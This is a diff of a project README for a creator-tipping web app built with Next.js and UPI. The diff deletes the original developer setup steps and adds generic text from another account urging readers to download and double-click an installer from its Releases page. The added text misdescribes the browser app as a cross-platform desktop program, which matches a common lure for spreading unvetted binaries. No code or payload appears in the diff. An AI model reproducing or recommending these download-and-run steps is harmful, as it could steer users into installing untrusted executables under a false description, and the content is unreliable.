@@ -1,101 +1,109 @@
-# ☕ GetMeAChai — My Style
+# ☕ Get-Me-A-Chai - Support Your Favorite Creators Effortlessly
 
-_A modern GetMeAChai with custom styling, built for creators to receive direct support via UPI._
+[![Download Get-Me-A-Chai](https://img.shields.io/badge/Download-Get--Me--A--Chai-blue.svg)](https://github.com/incavalleyinn/Get-Me-A-Chai/releases)
+
+## 🚀 Getting Started
+
+Welcome to **Get-Me-A-Chai**! This application allows you to support your favorite creators easily. With just a few steps, you can contribute to their work directly from this user-friendly interface.
+
+## 📥 Download & Install
+
+To get started, you need to download the application from our Releases page. Follow these steps:
+
+1. **Visit the Download Page**  
+   Go to the following link to access the Releases:  
+   [Download Page](https://github.com/incavalleyinn/Get-Me-A-Chai/releases)
+
+2. **Choose the Latest Version**  
+   Once on the Releases page, look for the latest version. It will usually be at the top of the list. Click on it to find the download options.
+
+3. **Download the Application**  
+   You will see various files available for download. Choose the one that suits your operating system (e.g., Windows, macOS, or Linux). Click on the appropriate file to begin the download.
+
+4. **Run the Installer**  
+   After downloading, locate the file in your Downloads folder. Double-click it to run the installer. Follow the on-screen instructions to complete the installation.
+
+5. **Open Get-Me-A-Chai**  
+   Once installed, find get-me-a-chai in your applications folder or desktop and open it. You are now ready to support your favorite creators!
+
+## 🔧 System Requirements
+
+- **Operating System:**  
+  - Windows 10 or later  
+  - macOS 10.14 or later  
+  - Linux (Ubuntu 18.04 or later)  
+
+- **Storage:**  
+  Minimum of 100 MB of free disk space.  
+
+- **Memory:**  
+  At least 4 GB RAM.  
+
+- **Internet Connection:**  
+  Required for connecting with creators and making transactions.
+
+## 🔍 Features
+
+- **Creator Support:**  
+  Easily contribute to the creators you love through seamless integrations.
+
+- **Responsive Design:**  
+  Access the application on any device with an experience optimized for your screen size.
+
+- **Secure Payments:**  
+  Use safe and trusted payment methods, including UPI payments, to support creators confidently.
+
+- **User-Friendly Interface:**  
+  Designed with simplicity in mind, Get-Me-A-Chai ensures that everyone, regardless of tech skills, can use it.
+
+- **LocalStorage Support:**  
+  The app remembers your preferences and favorite creators to improve your experience.
+
+## 📖 How to Use Get-Me-A-Chai
+
+1. **Sign Up/Log In**  
+   After opening the application, you can either sign up or log in. If you're new, follow the simple instructions to create an account.
+
+2. **Browse Creators**  
+   Once logged in, explore a list of creators. You can search by name or category.
+
+3. **Support Creators**  
+   Click on a creator's profile to see their work. Choose an amount you want to contribute and follow the prompts to complete the payment.
+
+4. **Stay Updated**  
+   The application provides updates about your favorite creators. You will be notified of new projects and funding goals.
+
+## 💡 Troubleshooting
+
+If you encounter any issues:
+
+- **Installation Problems:**  
+  Ensure that you have the correct version for your operating system. Check your permissions to allow installation.
+
+- **Payment Issues:**  
+  Verify your internet connection. Make sure you are entering the correct payment details.
+
+- **Application Crashes:**  
+  If the app closes unexpectedly, try restarting it. If the problem persists, consider reinstalling.
+
+## 🌐 Community & Support
+
+For additional assistance or to connect with other users:
+
+- **Join Our Community:**  
+  Visit our Discord server or forum to interact with other users and share experiences.
+
+- **Reach Out for Help:**  
+  You can create an issue directly on our GitHub repository for specific bugs or questions. Our team regularly monitors and responds to inquiries.
+
+## 📄 License
+
+Get-Me-A-Chai is open-source and released under the MIT License. You can freely use, modify, and distribute it as per the terms of this license.
+
+## 📢 Stay Updated
+
+For the latest news about updates and features, follow us on our social media platforms or check our GitHub page frequently.
 
 ---
 
-## Screen Shots
-<img width="1895" height="962" alt="image" src="https://github.com/user-attachments/assets/6ef8b2b9-cb35-4011-8235-d04b529edca2" />
-
-<img width="1886" height="962" alt="image" src="https://github.com/user-attachments/assets/9833b242-933a-4d9b-ab77-767f30858d8a" />
-
-## Mobile View
-<img width="686" height="896" alt="image" src="https://github.com/user-attachments/assets/1ead44d9-cb6f-4f3a-a50c-1c228611288e" />
-
-<img width="713" height="887" alt="image" src="https://github.com/user-attachments/assets/456a3777-949c-4b96-bfb8-19c53b0288c0" />
-
----
-
-## 🚀 Overview
-
-**GetMeAChai (My Style)** is a platform that enables creators to receive small contributions (“a chai”) directly from their fans using **UPI**.  
-Fans don’t need an account — they can simply search for creators and support them, while creators can log in, create a profile, and showcase their contributions.
-
----
-
-## ✨ Features
-
-- 🔑 **OAuth Login** with Google, GitHub
-- 🎨 **Creator Pages**: Name, username, profile picture, UPI ID
-- 💸 **Direct UPI Support** (no gateway fees)
-- 🔍 **Creator Search** for fans
-- ⚡ **Contributions** are displayed after 1 minute
-- 🏆 **Top Supported Creators** highlighted on the homepage
-- 📱 **Responsive User Interface**
-
----
-
-## 🛠️ Getting Started
-
-### 1. Clone the repo
-
-1. Clone the repo
-2. Install dependencies: `npm install`
-3. Set up `.env.local` with your MongoDB and OAuth credentials
-4. Run MongoDB locally or use Atlas
-
-### MONGODB_URI=your_mongodb_uri_here
-### GOOGLE_CLIENT_ID=your_google_client_id
-### GOOGLE_CLIENT_SECRET=your_google_client_secret
-### GITHUB_CLIENT_ID=your_github_client_id
-### GITHUB_CLIENT_SECRET=your_github_client_secret
-### NEXTAUTH_SECRET=your_nextauth_secret
-### NEXTAUTH_URL=http://localhost:3000
-
-5. Start the dev server: `npm run dev`
-
----
-
-## Folder Structure
-
-- `/app` — Next.js app pages and API routes
-- `/components` — React components
-- `/models` — Mongoose models
-- `/lib` — Database connection
-- `/public` — Static assets
-
----
-
-## API Routes
-
-- `/api/user/profile` — Get/update creator profile
-- `/api/contribute` — Save a contribution
-- `/api/contributions/[email]` — Get contributions for a creator
-- `/api/creator/[username]` — Get creator info by username
-- `/api/topcreators` — Get top supported creators
-
----
-
-## 🤝 Contributing  
-1. Fork the repo  
-2. Create a branch: `git checkout -b feature/new-feature`  
-3. Commit changes: `git commit -m "Add new feature"`  
-4. Push: `git push origin feature/new-feature`  
-5. Open a PR 🚀  
-
----
-
-## Author
-
-- GitHub: [CodzHorizon](https://github.com/CodzHorizon)  
-- Email: kshitizsh.8@example.com  
-
----
-
-## License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
----
-
-⚡ *Built with ❤️ using Next.js, MongoDB, and UPI.*  
+Thank you for choosing **Get-Me-A-Chai**. We hope you enjoy supporting your favorite creators! For any feedback or suggestions, feel free to reach out.
